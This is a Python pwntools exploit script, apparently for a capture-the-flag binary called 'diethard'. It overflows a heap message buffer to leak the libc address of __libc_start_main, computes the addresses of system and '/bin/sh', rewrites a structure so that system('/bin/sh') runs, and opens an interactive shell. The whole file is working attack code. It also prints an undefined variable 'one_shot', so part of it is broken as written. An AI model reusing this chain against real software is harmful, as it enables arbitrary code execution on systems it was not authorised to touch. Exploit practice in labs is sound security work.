from pwn import *
context(arch='amd64', os='linux')

def fn_addMsg(n, msg):
	p.sendline("1")
	print p.recv()

	p.sendline(str(n))
	print p.recv()

	p.sendline(msg)
	print p.recv()

def fn_delMsg(idx):
	p.sendline("2")
	print p.recv()

	p.sendline(str(idx))
	print p.recv()

def fn_leak(addr, n, title=""):
	print "*** {} *** : {}".format(hex(addr), title)
	print hexdump(p.leak(addr, n))

target = "./diethard"
p = process(target)
e = ELF(target)

got_libc = e.got["__libc_start_main"]

print p.recv()

addr_arrList = 0x603340
addr_c1 = 0x7ffff7ed8000
addr_c2 = 0x7ffff7ed8800
addr_c3 = 0x7ffff7ed9008
addr_cc1 = 0x7ffff7eda018

fn_addMsg(0x400, "A")
fn_addMsg(0x400, "B")
payload = "C" * 8
payload += p64(0x30)
payload += p64(got_libc)
payload += p64(0x400976)
fn_addMsg(2016, payload)

fn_leak(addr_arrList, 0x80)
fn_leak(addr_c1, 0x80)
fn_leak(addr_c2, 0x80)
fn_leak(addr_c3, 0x80)

p.sendline("2")
data = p.recvuntil("Which Message You Want To Delete?\n")
data = u64(data.split("1. ")[1][:6].ljust(8, "\x00"))

libc_base = data - 0x20740
addr_system = libc_base + 0x45390
binsh = libc_base + 0x18cd17

p.sendline("10")
print p.recv()

fn_delMsg(0)
fn_delMsg(1)
fn_delMsg(2)

fn_addMsg(1032, "A")
fn_addMsg(1032, "B")
payload = "C"*8
payload += p64(0x20)
payload += p64(binsh)
payload += p64(addr_system)
fn_addMsg(2016, payload)

print "__libc_start_main : " + hex(data)
print "one_shot          : " + hex(one_shot)

fn_leak(addr_arrList, 0x80)
fn_leak(addr_c1, 0x80)
fn_leak(addr_c2, 0x80)
fn_leak(addr_c3, 0x80)

p.sendline("2")
p.interactive()





